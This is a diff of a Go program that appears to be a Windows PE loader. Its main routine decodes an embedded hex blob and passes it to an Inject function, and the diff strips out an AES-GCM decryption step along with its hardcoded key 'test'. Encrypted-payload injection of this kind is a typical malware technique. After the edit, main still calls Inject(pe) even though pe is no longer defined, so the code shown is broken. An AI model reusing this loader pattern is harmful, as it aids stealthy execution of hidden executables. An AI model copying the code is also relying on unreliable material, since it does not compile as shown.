@@ -405,46 +405,14 @@ const (
 	IMAGE_REL_BASED_DIR64          IMAGE_REL_BASED = 10 //The base relocation applies the difference to the 64-bit field at offset.
 )
 
-/*
-   Checks for errors when reading in files
-*/
-func check(e error) {
-	if e != nil {
-		panic(e)
-	}
-}
-
-func createHash(key string) []byte {
-	hash := sha256.Sum256([]byte(key))
-	return hash[:]
-}
-
-func decrypt(data []byte, passphrase string) []byte {
-	key := []byte(createHash(passphrase))
-	block, err := aes.NewCipher(key)
-	if err != nil {
-		panic(err.Error())
-	}
-	gcm, err := cipher.NewGCM(block)
-	if err != nil {
-		panic(err.Error())
-	}
-	nonceSize := gcm.NonceSize()
-	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
-	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
-	if err != nil {
-		panic(err.Error())
-	}
-	return plaintext
-}
 
 func main() {
 
 	//Main Proc
-	const key = "test"
+
 	data := getHexString()
 	buf, _ := hex.DecodeString(data)
-	pe := decrypt(buf, key)
+
 	Inject(pe)
 
 }
